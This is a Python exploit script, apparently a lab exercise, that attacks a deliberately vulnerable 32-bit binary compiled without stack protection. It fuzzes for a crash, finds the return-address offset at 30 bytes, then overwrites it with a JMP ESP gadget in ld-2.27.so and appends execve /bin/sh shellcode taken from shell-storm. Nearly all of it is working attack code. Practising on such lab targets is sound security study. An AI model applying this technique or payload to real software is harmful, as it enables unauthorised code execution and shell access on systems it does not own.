#!/usr/bin/env python3
import os,struct

# no stack canaries, stack IS executable
# gcc -m32 -fno-stack-protector -zexecstack test.c -o test.elf


# http://shell-storm.org/shellcode/files/shellcode-575.php
# provides something similar for /bin/sh
shellcode = ( b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
              b"\x73\x68\x68\x2f\x62\x69\x6e\x89"
              b"\xe3\xb0\x0b\xcd\x80")

# Stage 1:  Fuzz for a crash
STAGE1="""
# fuzz for a crash; stack buffer overflow
param=b"edb --run ./test.elf '"
for i in range(0xa1, 0xff):
    param +=  b"%c" % i
param += b"'"
print(param)
input()
os.system(b"%s" % param)
"""

# Stage 2:  Control the crash
STAGE2="""
# Offset of 30 from the beginning of the user input; crash pointed at 0x323130bf
# echo "ibase=16;obase=A;BF-A1" |bc
# 30
param=b"edb --run ./test.elf '"
param+=b"A"*30
param+=struct.pack("<L",0xdeadbeef) 
param += b"'"
print(param)
input()
os.system(b"%s" % param)
# Crash now points at 0xdeadbeef
"""


# Stage 3:  No stack protect, executable stack, JMP ESP to shellcode (/bin/sh)
# STAGE3="""
param=b"edb --run ./test.elf '"
param=b"./test.elf '"
param+=b"A"*30
# JMP ESP located at 0x00000000f7dd6b51  in /lib32/ld-2.27.so 
param+=struct.pack("<L",0xf7dd6b51) ## return address
param+=shellcode
param += b"'"
print(param)
input()
os.system(b"%s" % param)
# """


